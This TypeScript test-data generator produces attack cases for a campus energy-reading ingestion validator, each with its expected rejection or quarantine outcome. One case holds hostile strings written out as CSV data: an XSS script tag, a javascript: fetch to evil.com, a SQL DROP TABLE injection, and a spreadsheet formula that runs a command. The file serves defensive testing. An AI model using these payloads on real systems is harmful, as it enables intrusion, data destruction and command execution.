/**
 * Attack Simulation Generators (MASTER.md §8.7)
 * Produces deterministic, safe test payloads with read-only escaped preview.
 */

export interface AttackCase {
  id: string;
  name: string;
  description: string;
  fileName: string;
  format: 'csv' | 'json';
  content: string;
  expectedOutcome: string;
}

export function generateAttackCases(nowIso?: string): AttackCase[] {
  const ts = nowIso || new Date().toISOString();

  return [
    {
      id: 'attack-missing-fields',
      name: 'Missing Required Fields',
      description: 'Injects records omitting mandatory powerKw, sourceId, and readingId.',
      fileName: 'attack_missing_fields.csv',
      format: 'csv',
      content: [
        'readingId,sourceId,roomId,timestamp,powerKw,occupancy,meterType,sensorStatus,note',
        `ATK-01,SRC-01,A-101,${ts},,25,UNIDIRECTIONAL,HEALTHY,Missing powerKw`,
        `,SRC-02,A-102,${ts},3.1,0,UNIDIRECTIONAL,HEALTHY,Missing readingId`,
        `ATK-03,,B-203,${ts},2.8,UNKNOWN,UNIDIRECTIONAL,OFFLINE,Missing sourceId`,
      ].join('\n'),
      expectedOutcome: '3 records flagged REJECTED with MISSING_REQUIRED_FIELD.',
    },
    {
      id: 'attack-negative-values',
      name: 'Negative Occupancy & Power',
      description: 'Injects negative occupancy counts (-12) and negative power on unidirectional circuits.',
      fileName: 'attack_negative_values.csv',
      format: 'csv',
      content: [
        'readingId,sourceId,roomId,timestamp,powerKw,occupancy,meterType,sensorStatus,note',
        `ATK-NEG-1,SRC-01,A-101,${ts},4.2,-15,UNIDIRECTIONAL,HEALTHY,Negative occupancy`,
        `ATK-NEG-2,SRC-01,A-102,${ts},-8.5,0,UNIDIRECTIONAL,HEALTHY,Negative power on unidirectional meter`,
        `ATK-NEG-3,SRC-02,L-301,${ts},-999.0,12,UNIDIRECTIONAL,HEALTHY,Extreme negative draw`,
      ].join('\n'),
      expectedOutcome: 'All records REJECTED with NEGATIVE_OCCUPANCY and NEGATIVE_POWER_UNIDIRECTIONAL.',
    },
    {
      id: 'attack-duplicates',
      name: 'Duplicate & Conflicting Readings',
      description: 'Injects both identical repeat readings and conflicting values for the same meter timestamp.',
      fileName: 'attack_duplicates.csv',
      format: 'csv',
      content: [
        'readingId,sourceId,roomId,timestamp,powerKw,occupancy,meterType,sensorStatus,note',
        `ATK-DUP-1,SRC-IOT,L-301,${ts},8.5,12,UNIDIRECTIONAL,HEALTHY,Original reading`,
        `ATK-DUP-1,SRC-IOT,L-301,${ts},8.5,12,UNIDIRECTIONAL,HEALTHY,Identical repeat (DUPLICATE)`,
        `ATK-CONF-1,SRC-IOT,A-101,${ts},4.2,30,UNIDIRECTIONAL,HEALTHY,Conflict instance A (4.2 kW)`,
        `ATK-CONF-2,SRC-IOT,A-101,${ts},12.8,30,UNIDIRECTIONAL,HEALTHY,Conflict instance B (12.8 kW)`,
      ].join('\n'),
      expectedOutcome: 'Row 2 flagged DUPLICATE; conflicting rows 3 & 4 QUARANTINED with CONFLICTING_DUPLICATE.',
    },
    {
      id: 'attack-invalid-timestamps',
      name: 'Invalid & Malformed Timestamps',
      description: 'Injects non-existent calendar dates (e.g. Feb 30th, month 15), future timestamps, and garbage dates.',
      fileName: 'attack_invalid_timestamps.json',
      format: 'json',
      content: JSON.stringify(
        [
          { readingId: 'TS-01', sourceId: 'SRC-01', roomId: 'A-101', timestamp: '2026-02-30T10:00:00Z', powerKw: 4.2, occupancy: 32 },
          { readingId: 'TS-02', sourceId: 'SRC-01', roomId: 'A-102', timestamp: '2026-15-40T25:99:00Z', powerKw: 3.1, occupancy: 0 },
          { readingId: 'TS-03', sourceId: 'SRC-02', roomId: 'B-203', timestamp: '2099-01-01T00:00:00Z', powerKw: 2.8, occupancy: 'UNKNOWN' },
          { readingId: 'TS-04', sourceId: 'SRC-03', roomId: 'L-301', timestamp: 'not-a-timestamp', powerKw: 8.5, occupancy: 12 },
        ],
        null,
        2
      ),
      expectedOutcome: 'All records QUARANTINED with INVALID_TIMESTAMP or FUTURE_TIMESTAMP.',
    },
    {
      id: 'attack-type-confusion',
      name: 'Unexpected Data Types',
      description: 'Injects strings into numeric fields ("high", "infinity", arrays) and floats into occupancy.',
      fileName: 'attack_type_confusion.json',
      format: 'json',
      content: JSON.stringify(
        [
          { readingId: 'TYPE-01', sourceId: 'SRC-01', roomId: 'A-101', timestamp: ts, powerKw: 'high', occupancy: 32 },
          { readingId: 'TYPE-02', sourceId: 'SRC-01', roomId: 'A-102', timestamp: ts, powerKw: 3.1, occupancy: 'three' },
          { readingId: 'TYPE-03', sourceId: 'SRC-02', roomId: 'B-203', timestamp: ts, powerKw: 'NaN', occupancy: 0 },
          { readingId: 'TYPE-04', sourceId: 'SRC-03', roomId: 'L-301', timestamp: ts, powerKw: 8.5, occupancy: 12.75 },
        ],
        null,
        2
      ),
      expectedOutcome: 'Records REJECTED with INVALID_POWER_TYPE and INVALID_OCCUPANCY_TYPE.',
    },
    {
      id: 'attack-malicious-payload',
      name: 'Malicious Script & Injection Strings',
      description: 'Injects XSS vectors (<script>, javascript:), SQL injections, and formula triggers (=cmd).',
      fileName: 'attack_malicious_script.csv',
      format: 'csv',
      content: [
        'readingId,sourceId,roomId,timestamp,powerKw,occupancy,meterType,sensorStatus,note',
        `SEC-01,SRC-01,A-101,${ts},4.2,30,UNIDIRECTIONAL,HEALTHY,<script>alert("XSS")</script>`,
        `SEC-02,SRC-02,A-102,${ts},3.1,0,UNIDIRECTIONAL,HEALTHY,javascript:fetch('//evil.com')`,
        `SEC-03,SRC-03,D-002,${ts},6.1,40,UNIDIRECTIONAL,HEALTHY,'; DROP TABLE campus_rooms; --`,
        `SEC-04,SRC-04,B-203,${ts},2.8,UNKNOWN,UNIDIRECTIONAL,OFFLINE,=cmd|' /C calc'!A0`,
      ].join('\n'),
      expectedOutcome: 'Rows 1-3 QUARANTINED (SUSPICIOUS_TEXT); Row 4 generates FORMULA_LIKE_TEXT warning. Strings rendered as inert text.',
    },
    {
      id: 'attack-malformed-structure',
      name: 'Malformed JSON / Truncated Structure',
      description: 'Injects unclosed JSON brackets and syntax errors simulating incomplete network transmission.',
      fileName: 'attack_malformed.json',
      format: 'json',
      content: '[\n  { "readingId": "MAL-01", "sourceId": "SRC-01", "roomId": "A-101", "timestamp": "' + ts + '", "powerKw": 4.2, "occupancy": 30,\n  { "readingId": "MAL-02", "sourceId": "SRC-01" // SYNTAX CORRUPTION',
      expectedOutcome: 'File-level rejection (FILE_REJECTED) with parser error. App stays completely responsive.',
    },
  ];
}
